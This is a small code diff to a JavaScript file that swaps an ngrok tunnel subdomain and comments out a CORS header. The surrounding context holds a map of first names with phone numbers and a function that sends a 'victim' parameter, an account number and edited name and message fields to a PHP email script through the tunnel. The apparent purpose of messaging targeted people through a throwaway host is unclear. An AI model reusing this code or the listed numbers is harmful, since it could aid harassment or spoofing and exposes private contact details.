@@ -1,4 +1,4 @@
-var phpFileDomainName = 'bf8929fb'
+var phpFileDomainName = 'bcfcb06b'
 
 var contactsMap = new Map([['jomar', '2163198688'],
                            ['jaden', '8032432431'],
@@ -24,7 +24,7 @@ function emailjs(victimVariable, editNameVariable, editMessageVariable, accountN
 	var randomNumberVariable = Math.floor((Math.random()*10000)+1).toString();
 	$.ajax({
 		//cache: false,
-		headers: {'Access-Control-Allow-Origin': '*'},
+		//headers: {'Access-Control-Allow-Origin': '*'},
 		url: 'https://'+phpFileDomainName+'.ngrok.io/php/email.php',
 		data: 'passToPC='+(Math.random() >= 0.5).toString()+'&accountNumber='+accountNumber+'&victimVariable='+victimVariable+'&editName='+editNameVariable+randomNumberVariable+'&editMessage='+editMessageVariable,
 		success: function(data) {
